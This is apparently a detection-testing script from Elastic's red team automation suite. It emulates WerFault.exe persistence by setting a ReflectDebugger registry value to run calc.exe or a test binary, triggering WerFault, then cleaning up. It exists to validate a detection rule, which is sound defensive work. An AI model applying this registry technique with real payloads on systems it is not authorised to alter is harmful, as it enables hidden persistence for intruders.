# Copyright Elasticsearch B.V. and/or licensed to Elasticsearch B.V. under one
# or more contributor license agreements. Licensed under the Elastic License
# 2.0; you may not use this file except in compliance with the Elastic License
# 2.0.

# Name: WerFault.exe Persistence
# RTA: werfault_persistence.py
# signal.rule.name: Process Potentially Masquerading as WerFault
# ATT&CK: T1112
# Description: Sets an executable to run when WerFault is run with -rp flags and runs it

import time

from . import common
from . import RtaMetadata

MY_APP = common.get_path("bin", "myapp.exe")


metadata = RtaMetadata(
    uuid="cbd90dde-02f4-4010-b654-ccabff3c3c73",
    platforms=["windows"],
    endpoint=[],
    siem=[{"rule_id": "ac5012b8-8da8-440b-aaaf-aedafdea2dff", "rule_name": "Suspicious WerFault Child Process"}],
    techniques=["T1036"],
)


@common.requires_os(metadata.platforms)
@common.dependencies(MY_APP)
def main():
    reg_key = "'HKLM:\\SOFTWARE\\Microsoft\\Windows\\Windows Error Reporting\\hangs'"
    reg_name = "ReflectDebugger"

    commands = ["C:\\Windows\\system32\\calc.exe", "'powershell -c calc.exe'", MY_APP]

    for command in commands:
        common.log("Setting WerFault reg key to {}".format(command))
        common.execute(
            [
                "powershell",
                "-c",
                "New-ItemProperty",
                "-Path",
                reg_key,
                "-Name",
                reg_name,
                "-Value",
                command,
            ],
            wait=False,
        )
        time.sleep(1)

        common.log("Running WerFault.exe -pr 1")
        common.execute(["werfault", "-pr", "1"], wait=False)
        time.sleep(2.5)

        common.execute(
            [
                "powershell",
                "-c",
                "Remove-ItemProperty",
                "-Path",
                reg_key,
                "-Name",
                reg_name,
            ]
        )

    common.log("Cleaning up")

    common.execute(["taskkill", "/F", "/im", "calc.exe"])
    common.execute(["taskkill", "/F", "/im", "calculator.exe"])
    common.execute(["taskkill", "/F", "/im", "myapp.exe"])


if __name__ == "__main__":
    exit(main())
